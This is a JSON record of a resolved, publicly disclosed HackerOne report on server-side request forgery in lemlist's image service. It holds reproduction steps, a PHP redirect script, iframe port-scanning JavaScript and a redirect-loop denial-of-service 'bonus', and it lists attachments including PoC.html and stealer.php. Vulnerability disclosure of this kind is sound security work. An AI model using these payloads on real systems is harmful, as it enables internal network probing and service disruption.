@@ -1,0 +1,219 @@
+{
+  "id": 783392,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODMzOTI=",
+  "url": "https://hackerone.com/reports/783392",
+  "title": "SSRF in img.lemlist.com that leads to Localhost Port Scanning",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-01-26T00:06:09.103Z",
+  "submitted_at": "2020-01-26T00:06:09.103Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "arsene_lupin",
+    "url": "/arsene_lupin",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/huy2hc0vba7y2tpj4ztqxfs5wvaw/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 44045,
+    "url": "https://hackerone.com/lemlist",
+    "handle": "lemlist",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mnjvbzddg4cv6q2aeiugho7ozkth/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/mnjvbzddg4cv6q2aeiugho7ozkth/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "lemlist",
+      "twitter_handle": "",
+      "website": "https://lemlist.com",
+      "about": "lempire is a tech company that specializes in developing solutions for email outreach and productivity, aimed at enhancing growth for businesses"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-05-28T10:39:49.300Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-05-21T01:22:11.776Z",
+  "team_member_agreed_on_going_public_at": "2020-05-28T10:39:49.212Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nA SSRF attack can be performed leading to localhost port scanning.\nLink : https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@\n\n## Steps To Reproduce:\nTo perform this port scan you'll need to setup a few files.\n\nFirst of all you need to change the url in {F696241}. {F696243}\n\nThat being done you will need to do the same thing in your redirection script\n```php\n<?php\n\t// PHP permanent URL redirection\n\theader(\"Location: [YOUR WEBSITE]/PoC.html?i=0\", true, 301);\n\texit();\n?>\n```\n\nNow you need to setup a website who will host {F696241}, {F696249} and the redirection.\n\nI suggest to put everything in a single file and run the command :\n`php -S 0.0.0.0:80`\n\nAfterward you need to go to the following link:\n`https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@ [YOUR WEBSITE]`\n\n## PoC\nHere is a PoC of the Port Scan beeing performed {F696236}\n\n## Advice\n\nSometimes this port scan only return one port or none due to headless chrome screenshoting the website before the redirection. I would suggest to try different timeout in the ` scanChromeLinux()` function.\n\n```javascript\nasync scanChromeLinux(iframe, a) {\n    var that = this;\n    let promise = new Promise(function(resolve, reject){\n        that.hooks = {oncomplete:function(){\n          document.body.removeChild(iframe);\n          resolve();\n        }};\n        that.scan = function() {\n            var port = that.q.shift(), calls = 0, timer;\n            iframe.src = that.url + \":\" + port;\n            a.href = iframe.src + '#';\n            that.updateProgress(port);\n            iframe.hasLoadedOnce = 0;\n            iframe.onload = function(){\n                calls++;\n                if(calls > 1) {\n                  clearTimeout(timer);\n                  that.next();\n                  return;\n                }\n                iframe.hasLoadedOnce = 1;\n                a.click();\n            };\n            timer = setTimeout(function(){\n              if(iframe.hasLoadedOnce) {\n                that.openPorts.push(port);\n              }\n              that.next();\n            }, 500 ); // <-- CHANGE THAT VALUE\n        };\n        that.scan();\n    });\n    return promise;\n  }\n```\n\n##Bonus\n\nYou can perform a DOS on the website by making the redirection returning itself: \n```php\n<?php\n\t// PHP permanent URL redirection\n\theader(\"Location:https://img.lemlist.com/api/image-templates/itp_vBBNpQuMsy6FYLQAc/?preview=true&email=email@[YOUR WEBSITE]\", true, 301);\n\texit();\n?>\n```\n\n## Impact\n\nWe can Port Scan local and remote servers, directory and bruteforce HTTP services.\nBesides if the screenshot as enough quality, it would be possible to return sensitives data from local HTTP services running on the machine.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 696236,
+      "file_name": "PoC.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zvuYphpksgWNhn6oLT2h2BG9?response-content-disposition=attachment%3B%20filename%3D%22PoC.mp4%22%3B%20filename%2A%3DUTF-8%27%27PoC.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQG25RBQ6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050708Z&X-Amz-Expires=896&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCzmZZdsgYhNGiAyV2w0x3AxFk%2FLt0ZYHT6%2BmcAysTUSAIhAJvmVr%2FbaurSoGNdiFz0t3yo0KnWZF6mVbkLPY7t33I2KrIFCHgQAxoMMDEzNjE5Mjc0ODQ5IgxjDhk0pb0Wrk25v84qjwUpTpt1TWh1Wtl4mcsHOtiw3NBitwEV7N7wXVfQszLYFpphVkI832Vv8y0KSr1YMGQhooNnUNsxw9juTuDG%2Fswosm1qUdLypBtxgGN1JK%2FHa9%2FxNGJPNN1sYal5vXxeWy%2FF7QRe8jFp0JaMz7pUco8dV34nkN5jWDT3Y5R9RK3HXKxuDiTXKdzGYlGNED%2B9DL1usCMV2%2FRteKr8%2FPu7VomoIKSO8WqeufU1P82R3WBdAAXmSc9teH%2BEfoNQjeDgIn%2FrtXR6epoNlEAIb8Xte3UesXmpyRd7vcRdHiA%2F3K%2BdMyx4Aritdix8ZJgAEtBsr9AWih%2Bx3BqSHhOhREJ24eIdq%2BE7xlXdpCmF0uI23iysanOIZv1Cv4QZFHuq5OAaTDXpbBLRyy7UltuoyPqUjCH%2BX7p7DsjYQb3d6ASDpY66MaGJIvTufFOG0OAbZr1S5WIKc06xmegcLALtgPCQAwkKiTSsQuwJA8QuA5QLE5JA6qo8ysu5CgDU2PhRVEFMv6WnTl06k1ciARVnJUoyZEF2oPMl7ZYMEG4t3tNEdzgEmeiLBOEjp6thyYDvX1DU10vfMHPbXh%2FX4cMmR5N7RqpXU6H86ceRV%2BGmyPnFv%2FgtMRwZfMUu4uHvosn5RuImeCHjZrdXJybd4kPk6xGnpzLbztar77TlIiFBeZPFw%2BG9FnUyan8ebr5zyxGb7C2ogaqTUHAWDTagQRPMrheYwsYzwo9QunUxLXBqX2ztcWbOXwiidBQ%2Bglb1kjy6pPwoApn42DX5aruWmBEMS7I8bzWgUkQe9rn0XNYUTsB6RqbLbqR6clmcT91p95FjPov%2BS2xm9%2B5VkTgGxUBXg5APHLRlzj17iDSLIyJoIJ%2FMxSm8MNyJttIGOrABZxCRzHljLfRH5Muj798gjd4gd9%2BauLJp%2BeGDIDxlQoTOI5jbSjYeV6khN1p3GTdTlIey3rp9qyxuDU7hXbbQtB54s3CbJgXDvummDjmpHSOqf8BZ%2B4XbVcc09dOnoMUADpRIqM%2FhUEe6KLELPB0NTciMdvqEyi7jjX3FPYet8d6uMdjZ%2BTnUha52k8%2BwLh%2BFdaJOxxwZ8i7opa5gor7qA0ATowM3HD5PFt9GGkIOlWU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=829109e7ae0a54acce75b5f159ba142e60efcd27c19e30c181c87959f2f96231",
+      "file_size": 5934400,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 696241,
+      "file_name": "PoC.html",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2Ysd5TBB9qJqcBr2mvozHoQG?response-content-disposition=attachment%3B%20filename%3D%22PoC.html%22%3B%20filename%2A%3DUTF-8%27%27PoC.html&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQG25RBQ6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050708Z&X-Amz-Expires=896&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCzmZZdsgYhNGiAyV2w0x3AxFk%2FLt0ZYHT6%2BmcAysTUSAIhAJvmVr%2FbaurSoGNdiFz0t3yo0KnWZF6mVbkLPY7t33I2KrIFCHgQAxoMMDEzNjE5Mjc0ODQ5IgxjDhk0pb0Wrk25v84qjwUpTpt1TWh1Wtl4mcsHOtiw3NBitwEV7N7wXVfQszLYFpphVkI832Vv8y0KSr1YMGQhooNnUNsxw9juTuDG%2Fswosm1qUdLypBtxgGN1JK%2FHa9%2FxNGJPNN1sYal5vXxeWy%2FF7QRe8jFp0JaMz7pUco8dV34nkN5jWDT3Y5R9RK3HXKxuDiTXKdzGYlGNED%2B9DL1usCMV2%2FRteKr8%2FPu7VomoIKSO8WqeufU1P82R3WBdAAXmSc9teH%2BEfoNQjeDgIn%2FrtXR6epoNlEAIb8Xte3UesXmpyRd7vcRdHiA%2F3K%2BdMyx4Aritdix8ZJgAEtBsr9AWih%2Bx3BqSHhOhREJ24eIdq%2BE7xlXdpCmF0uI23iysanOIZv1Cv4QZFHuq5OAaTDXpbBLRyy7UltuoyPqUjCH%2BX7p7DsjYQb3d6ASDpY66MaGJIvTufFOG0OAbZr1S5WIKc06xmegcLALtgPCQAwkKiTSsQuwJA8QuA5QLE5JA6qo8ysu5CgDU2PhRVEFMv6WnTl06k1ciARVnJUoyZEF2oPMl7ZYMEG4t3tNEdzgEmeiLBOEjp6thyYDvX1DU10vfMHPbXh%2FX4cMmR5N7RqpXU6H86ceRV%2BGmyPnFv%2FgtMRwZfMUu4uHvosn5RuImeCHjZrdXJybd4kPk6xGnpzLbztar77TlIiFBeZPFw%2BG9FnUyan8ebr5zyxGb7C2ogaqTUHAWDTagQRPMrheYwsYzwo9QunUxLXBqX2ztcWbOXwiidBQ%2Bglb1kjy6pPwoApn42DX5aruWmBEMS7I8bzWgUkQe9rn0XNYUTsB6RqbLbqR6clmcT91p95FjPov%2BS2xm9%2B5VkTgGxUBXg5APHLRlzj17iDSLIyJoIJ%2FMxSm8MNyJttIGOrABZxCRzHljLfRH5Muj798gjd4gd9%2BauLJp%2BeGDIDxlQoTOI5jbSjYeV6khN1p3GTdTlIey3rp9qyxuDU7hXbbQtB54s3CbJgXDvummDjmpHSOqf8BZ%2B4XbVcc09dOnoMUADpRIqM%2FhUEe6KLELPB0NTciMdvqEyi7jjX3FPYet8d6uMdjZ%2BTnUha52k8%2BwLh%2BFdaJOxxwZ8i7opa5gor7qA0ATowM3HD5PFt9GGkIOlWU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7223ed9e72a9b6475652ae427829b4d5c380d1b970b04a820a095aaa35ae4439",
+      "file_size": 15819,
+      "type": "text/html",
+      "moderated": null
+    },
+    {
+      "id": 696243,
+      "file_name": "changeline.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NjxyDxzeYoAt9mM2ZGU8eYkM?response-content-disposition=attachment%3B%20filename%3D%22changeline.png%22%3B%20filename%2A%3DUTF-8%27%27changeline.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQG25RBQ6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050708Z&X-Amz-Expires=896&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCzmZZdsgYhNGiAyV2w0x3AxFk%2FLt0ZYHT6%2BmcAysTUSAIhAJvmVr%2FbaurSoGNdiFz0t3yo0KnWZF6mVbkLPY7t33I2KrIFCHgQAxoMMDEzNjE5Mjc0ODQ5IgxjDhk0pb0Wrk25v84qjwUpTpt1TWh1Wtl4mcsHOtiw3NBitwEV7N7wXVfQszLYFpphVkI832Vv8y0KSr1YMGQhooNnUNsxw9juTuDG%2Fswosm1qUdLypBtxgGN1JK%2FHa9%2FxNGJPNN1sYal5vXxeWy%2FF7QRe8jFp0JaMz7pUco8dV34nkN5jWDT3Y5R9RK3HXKxuDiTXKdzGYlGNED%2B9DL1usCMV2%2FRteKr8%2FPu7VomoIKSO8WqeufU1P82R3WBdAAXmSc9teH%2BEfoNQjeDgIn%2FrtXR6epoNlEAIb8Xte3UesXmpyRd7vcRdHiA%2F3K%2BdMyx4Aritdix8ZJgAEtBsr9AWih%2Bx3BqSHhOhREJ24eIdq%2BE7xlXdpCmF0uI23iysanOIZv1Cv4QZFHuq5OAaTDXpbBLRyy7UltuoyPqUjCH%2BX7p7DsjYQb3d6ASDpY66MaGJIvTufFOG0OAbZr1S5WIKc06xmegcLALtgPCQAwkKiTSsQuwJA8QuA5QLE5JA6qo8ysu5CgDU2PhRVEFMv6WnTl06k1ciARVnJUoyZEF2oPMl7ZYMEG4t3tNEdzgEmeiLBOEjp6thyYDvX1DU10vfMHPbXh%2FX4cMmR5N7RqpXU6H86ceRV%2BGmyPnFv%2FgtMRwZfMUu4uHvosn5RuImeCHjZrdXJybd4kPk6xGnpzLbztar77TlIiFBeZPFw%2BG9FnUyan8ebr5zyxGb7C2ogaqTUHAWDTagQRPMrheYwsYzwo9QunUxLXBqX2ztcWbOXwiidBQ%2Bglb1kjy6pPwoApn42DX5aruWmBEMS7I8bzWgUkQe9rn0XNYUTsB6RqbLbqR6clmcT91p95FjPov%2BS2xm9%2B5VkTgGxUBXg5APHLRlzj17iDSLIyJoIJ%2FMxSm8MNyJttIGOrABZxCRzHljLfRH5Muj798gjd4gd9%2BauLJp%2BeGDIDxlQoTOI5jbSjYeV6khN1p3GTdTlIey3rp9qyxuDU7hXbbQtB54s3CbJgXDvummDjmpHSOqf8BZ%2B4XbVcc09dOnoMUADpRIqM%2FhUEe6KLELPB0NTciMdvqEyi7jjX3FPYet8d6uMdjZ%2BTnUha52k8%2BwLh%2BFdaJOxxwZ8i7opa5gor7qA0ATowM3HD5PFt9GGkIOlWU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2aa84ced596b602108fdc5d6baf80656529b449dd610b27f9ba03d581401bafb",
+      "file_size": 2189,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 696249,
+      "file_name": "stealer.php",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ru9GzA8pKKJjSHSUzvVnwtWR?response-content-disposition=attachment%3B%20filename%3D%22stealer.php%22%3B%20filename%2A%3DUTF-8%27%27stealer.php&response-content-type=application%2Fx-php&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQG25RBQ6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050708Z&X-Amz-Expires=896&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEK%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCzmZZdsgYhNGiAyV2w0x3AxFk%2FLt0ZYHT6%2BmcAysTUSAIhAJvmVr%2FbaurSoGNdiFz0t3yo0KnWZF6mVbkLPY7t33I2KrIFCHgQAxoMMDEzNjE5Mjc0ODQ5IgxjDhk0pb0Wrk25v84qjwUpTpt1TWh1Wtl4mcsHOtiw3NBitwEV7N7wXVfQszLYFpphVkI832Vv8y0KSr1YMGQhooNnUNsxw9juTuDG%2Fswosm1qUdLypBtxgGN1JK%2FHa9%2FxNGJPNN1sYal5vXxeWy%2FF7QRe8jFp0JaMz7pUco8dV34nkN5jWDT3Y5R9RK3HXKxuDiTXKdzGYlGNED%2B9DL1usCMV2%2FRteKr8%2FPu7VomoIKSO8WqeufU1P82R3WBdAAXmSc9teH%2BEfoNQjeDgIn%2FrtXR6epoNlEAIb8Xte3UesXmpyRd7vcRdHiA%2F3K%2BdMyx4Aritdix8ZJgAEtBsr9AWih%2Bx3BqSHhOhREJ24eIdq%2BE7xlXdpCmF0uI23iysanOIZv1Cv4QZFHuq5OAaTDXpbBLRyy7UltuoyPqUjCH%2BX7p7DsjYQb3d6ASDpY66MaGJIvTufFOG0OAbZr1S5WIKc06xmegcLALtgPCQAwkKiTSsQuwJA8QuA5QLE5JA6qo8ysu5CgDU2PhRVEFMv6WnTl06k1ciARVnJUoyZEF2oPMl7ZYMEG4t3tNEdzgEmeiLBOEjp6thyYDvX1DU10vfMHPbXh%2FX4cMmR5N7RqpXU6H86ceRV%2BGmyPnFv%2FgtMRwZfMUu4uHvosn5RuImeCHjZrdXJybd4kPk6xGnpzLbztar77TlIiFBeZPFw%2BG9FnUyan8ebr5zyxGb7C2ogaqTUHAWDTagQRPMrheYwsYzwo9QunUxLXBqX2ztcWbOXwiidBQ%2Bglb1kjy6pPwoApn42DX5aruWmBEMS7I8bzWgUkQe9rn0XNYUTsB6RqbLbqR6clmcT91p95FjPov%2BS2xm9%2B5VkTgGxUBXg5APHLRlzj17iDSLIyJoIJ%2FMxSm8MNyJttIGOrABZxCRzHljLfRH5Muj798gjd4gd9%2BauLJp%2BeGDIDxlQoTOI5jbSjYeV6khN1p3GTdTlIey3rp9qyxuDU7hXbbQtB54s3CbJgXDvummDjmpHSOqf8BZ%2B4XbVcc09dOnoMUADpRIqM%2FhUEe6KLELPB0NTciMdvqEyi7jjX3FPYet8d6uMdjZ%2BTnUha52k8%2BwLh%2BFdaJOxxwZ8i7opa5gor7qA0ATowM3HD5PFt9GGkIOlWU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5b13c106e1758a1e447cb35a97d67b02c0979e16431ab9a426165be88ee87876",
+      "file_size": 141,
+      "type": "application/x-php",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "loaymorad",
+    "omarelfarsaoui",
+    "arsene_lupin",
+    "soiax",
+    "d3f4u17",
+    "0xm0r4d",
+    "ayoub0x1",
+    "savxiety",
+    "ragnarokv",
+    "brahim_boufakri01",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 37907,
+    "asset_type": "URL",
+    "asset_identifier": "app.lemlist.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "783392",
+  "votes": 23,
+  "latest_disclosable_activity_at": "2020-05-28T10:39:49.328Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:07:09.060561",
+    "source": "https://hackerone.com/reports/783392.json",
+    "report_id": 783392
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODMzOTI=",
+    "databaseId": "783392",
+    "title": "SSRF in img.lemlist.com that leads to Localhost Port Scanning",
+    "url": "https://hackerone.com/reports/783392",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-05-28T10:39:49.300Z",
+    "created_at": "2020-01-26T00:06:09.103Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzY4",
+      "name": "Server-Side Request Forgery (SSRF)",
+      "external_id": "cwe-918"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "arsene_lupin"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vNDQwNDU=",
+      "handle": "lemlist",
+      "name": "lemlist",
+      "url": "https://hackerone.com/lemlist",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzc4MzM5Mg==",
+    "_id": "783392",
+    "disclosed": true,
+    "votes": 23,
+    "latest_disclosable_activity_at": "2020-05-28T10:39:49.328Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODMzOTI=",
+      "databaseId": "783392",
+      "title": "SSRF in img.lemlist.com that leads to Localhost Port Scanning",
+      "url": "https://hackerone.com/reports/783392",
+      "disclosed_at": "2020-05-28T10:39:49.300Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vNDQwNDU=",
+      "handle": "lemlist",
+      "name": "lemlist",
+      "url": "https://hackerone.com/lemlist",
+      "currency": "usd"
+    }
+  }
+}
